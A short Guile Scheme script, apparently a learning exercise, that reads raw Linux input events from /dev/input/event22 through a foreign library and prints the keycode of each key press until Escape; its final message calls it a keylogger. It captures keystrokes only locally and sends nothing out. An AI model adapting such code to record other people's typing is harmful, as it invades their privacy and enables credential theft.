(use-modules
 (srfi srfi-9)
 (system foreign)
 (ice-9 binary-ports)
 (rnrs bytevectors)
 (system foreign-object))

;; Create handler for libinput
(define libinput (dynamic-link "input.so"))

(define* (get bv #:optional (type 'code))
  (let* ((fn (format #f "get_~a" type))
	 (method (pointer->procedure
		  int
		  (dynamic-func fn libinput)
		  '(*))))
    (method (bytevector->pointer bv))))

(call-with-input-file 
    "/dev/input/event22"
  (lambda (port)
    (let* ((nbytes 24)
	   (bv (make-bytevector nbytes))
	   (code 0))
      (while (not (= 1 code))
	(get-bytevector-n! port bv 0 nbytes)
	(set! code (get bv))
	(when (= 1 (get bv 'value)) ;; key press
	  (format #t "Keycode: ~a\n" code)
	  ))))

  #:binary #t)

(format #t "\nFinished kylogger.\n")
(dynamic-unlink libinput)
